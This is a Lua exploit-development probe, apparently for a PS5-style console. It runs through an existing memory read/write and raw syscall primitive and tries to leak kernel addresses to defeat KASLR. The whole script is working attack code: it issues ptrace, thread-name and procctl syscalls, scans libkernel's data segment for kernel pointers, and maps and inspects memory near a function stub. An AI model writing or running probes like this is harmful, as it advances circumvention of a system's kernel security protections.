-- CRASH_CLASS: MODERATE (ptrace might crash, thread ops safe)
-- PROBE 42j: ptrace + thread ops + libkernel data segment scan
--
-- Last attempts at info leak for KASLR defeat:
--   A) ptrace(PT_GETREGS) on self — debug registers might have kernel addrs
--   B) thr_self, thr_get_name — thread syscalls
--   C) procctl (544) — process control info
--   D) libkernel data segment scan — GOT/PLT resolved pointers
--   E) Read fn_addr region to understand what memory range it's in

print("=== PROBE 42j: THREAD/PTRACE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local sc_getpid = make_syscall(20)
local sc_mmap = make_syscall(477)
local sc_munmap = make_syscall(588)
local sc_dgi = make_syscall(593)
local sc_dgl = make_syscall(592)
local pid = 0
pcall(function() pid = to_num(sc_getpid()) end)
print("pid: " .. pid)

local kptrs = {}

--------------------------------------------------------------------
-- A) ptrace (26) — try PT_GETREGS
--------------------------------------------------------------------
-- A) ptrace SKIPPED — crashes the loader (hard fault on syscall 26)
print("=== A: PTRACE SKIPPED (crashes) ===")
if false then
    local sc_ptrace = make_syscall(26)
    local regs = memory.alloc(0x200)
    for i = 0, 0xFF, 4 do safe_wd(regs+i, 0) end
    local ok, ret = pcall(function()
        return sc_ptrace(uint64(33), uint64(pid), uint64(regs), uint64(0))
    end)
    local rv = ok and to_num(ret) or -999
    print(string.format("  PT_GETREGS: ret=%d", rv))
    if rv == 0 then
        for off = 0, 0xA8, 8 do
            local q = safe_rq(regs + off)
            if q then
                local h, l = get_hi_lo(q)
                if h >= 0xFFFF8000 then
                    print(string.format("    +%02X: %08X_%08X KPTR!", off, h, l))
                    kptrs[#kptrs+1] = {src="ptrace", off=off, h=h, l=l}
                elseif h ~= 0 or l ~= 0 then
                    print(string.format("    +%02X: %08X_%08X", off, h, l))
                end
            end
        end
    end
end

--------------------------------------------------------------------
-- B) Thread syscalls
--------------------------------------------------------------------
print("")
print("=== B: THREAD ===")
do
    -- thr_self (432) — get thread ID
    local sc_thr_self = make_syscall(432)
    local tid_buf = memory.alloc(8)
    safe_wd(tid_buf, 0)
    local ok, ret = pcall(function() return sc_thr_self(uint64(tid_buf)) end)
    local rv = ok and to_num(ret) or -999
    local tid = safe_rd(tid_buf) or 0
    print(string.format("  thr_self: ret=%d tid=%d", rv, tid))

    -- thr_get_name (629 on PS5?)
    local sc_thr_name = make_syscall(629)
    local name_buf = memory.alloc(64)
    for i = 0, 60, 4 do safe_wd(name_buf+i, 0) end
    ok, ret = pcall(function() return sc_thr_name(uint64(tid), uint64(name_buf), uint64(64)) end)
    rv = ok and to_num(ret) or -999
    if rv == 0 then
        local name = ""
        for i = 0, 31 do
            local b = safe_rd(name_buf + i)
            if b then b = b % 256
                if b >= 0x20 and b < 0x7F then name = name .. string.char(b)
                elseif b == 0 then break end
            end
        end
        print(string.format("  thread name: '%s'", name))
    else
        print(string.format("  thr_get_name: ret=%d", rv))
    end
end

--------------------------------------------------------------------
-- C) procctl (544) — process control
--------------------------------------------------------------------
print("")
print("=== C: PROCCTL ===")
do
    local sc_procctl = make_syscall(544)
    local info = memory.alloc(0x100)

    -- Try PROC_REAP_STATUS=4, PROC_REAP_GETPIDS=5
    -- Also PROC_ASLR_STATUS=19 (might reveal ASLR config!)
    local ops = {
        {id=19, name="ASLR_STATUS"},
        {id=20, name="ASLR_CTL"},
        {id=30, name="STACKGAP_STATUS"},
        {id=36, name="NO_NEW_PRIVS_STATUS"},
    }
    for _, op in ipairs(ops) do
        for i = 0, 0x3F, 4 do safe_wd(info+i, 0) end
        -- procctl(idtype=P_PID=0, id=pid, cmd, data)
        local ok, ret = pcall(function()
            return sc_procctl(uint64(0), uint64(pid), uint64(op.id), uint64(info))
        end)
        local rv = ok and to_num(ret) or -999
        if rv == 0 then
            local v = safe_rd(info)
            print(string.format("  %s: ret=%d val=%d", op.name, rv, v or -1))
        else
            print(string.format("  %s: ret=%d", op.name, rv))
        end
    end
end

--------------------------------------------------------------------
-- D) Libkernel data segment scan — look for kernel addresses
--------------------------------------------------------------------
print("")
print("=== D: LIBKERNEL DATA ===")
do
    local handles = memory.alloc(256)
    local num_buf = memory.alloc(8)
    pcall(function() sc_dgl(handles, 64, num_buf) end)
    local num = safe_rd(num_buf) or 0
    local info = memory.alloc(0x200)

    local libk_data_h, libk_data_l = 0, 0
    local libk_data_sz = 0

    for i = 0, math.min(num-1, 39) do
        local h = safe_rd(handles + i * 4)
        if h and h > 0 then
            for j = 0, 0x1F, 4 do safe_wd(info+j, 0) end
            safe_wd(info, 0x160)
            pcall(function() sc_dgi(uint64(h), info) end)
            local b = safe_rd(info + 8)
            if b and (b % 256) == string.byte("l") then
                local name = ""
                for j = 0, 15 do
                    local c = safe_rd(info + 8 + j)
                    if c then c = c % 256
                        if c >= 0x20 and c < 0x7F then name = name .. string.char(c)
                        elseif c == 0 then break end
                    end
                end
                if name:find("libkernel") then
                    libk_data_l = safe_rd(info + 0x118) or 0
                    libk_data_h = safe_rd(info + 0x11C) or 0
                    local sz_l = safe_rd(info + 0x120) or 0
                    libk_data_sz = sz_l % 0x100000  -- mask out flags
                    break
                end
            end
        end
    end

    if libk_data_h > 0 or libk_data_l > 0 then
        print(string.format("libkernel data: %08X_%08X sz=0x%X", libk_data_h, libk_data_l, libk_data_sz))

        local data_addr = uint64(string.format("0x%X%08X", libk_data_h, libk_data_l))

        -- Scan first 0x400 bytes of data segment for kernel pointers
        local found = 0
        for off = 0, math.min(libk_data_sz - 8, 0x3F8), 8 do
            local q = safe_rq(data_addr + off)
            if q then
                local h, l = get_hi_lo(q)
                if h >= 0xFFFF8000 then
                    print(string.format("  +%03X: %08X_%08X KPTR!", off, h, l))
                    kptrs[#kptrs+1] = {src="libk_data", off=off, h=h, l=l}
                    found = found + 1
                end
            else
                break
            end
        end
        if found == 0 then print("  no kernel pointers in first 1KB") end
    end
end

--------------------------------------------------------------------
-- E) Map fn_addr region — check what's around it
--------------------------------------------------------------------
print("")
print("=== E: FN_ADDR REGION ===")
do
    local gpu_size = 512 * 0x4000
    local gpu
    pcall(function()
        gpu = sc_mmap(uint64(0), uint64(gpu_size), uint64(0x33),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)

    if gpu then
        local ps = tostring(syscall.pipe)
        local fas = ps:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
        if fas then
            local fp = uint64(fas)
            local fvl = safe_rd(fp) or 0
            local fvh = safe_rd(fp + 4) or 0

            -- Check what's at fn_addr region - scan backward and forward
            -- to find the boundaries of this mapping
            local fn_base = uint64(string.format("0x%X%08X", fvh, fvl))

            -- Read page-aligned start
            local page_l = fvl - (fvl % 0x4000)
            local page_base = uint64(string.format("0x%X%08X", fvh, page_l))
            print(string.format("fn_addr page: %08X_%08X", fvh, page_l))

            -- Read first and last qwords of the page
            local first = safe_rq(page_base)
            if first then
                local fh, fl = get_hi_lo(first)
                print(string.format("  page+000: %08X_%08X", fh, fl))
                -- Look for ELF magic or other signatures
                if fl == 0x464C457F then print("  *** ELF HEADER ***") end
            else
                print("  page start: not readable")
            end

            -- Check if there's a page BEFORE
            local prev_page = uint64(string.format("0x%X%08X", fvh, page_l - 0x4000))
            local pq = safe_rq(prev_page)
            print(string.format("  prev page (%08X_%08X): %s", fvh, page_l - 0x4000,
                pq and "readable" or "NOT readable"))
        end

        pcall(function() sc_munmap(gpu, uint64(gpu_size)) end)
    end
end

--------------------------------------------------------------------
-- SUMMARY
--------------------------------------------------------------------
print("")
print("=== SUMMARY ===")
print("kernel pointers: " .. #kptrs)
for _, kp in ipairs(kptrs) do
    print(string.format("  [%s +%03X] %08X_%08X", kp.src, kp.off, kp.h, kp.l))
end

print("")
print("=== PROBE 42j COMPLETE ===")
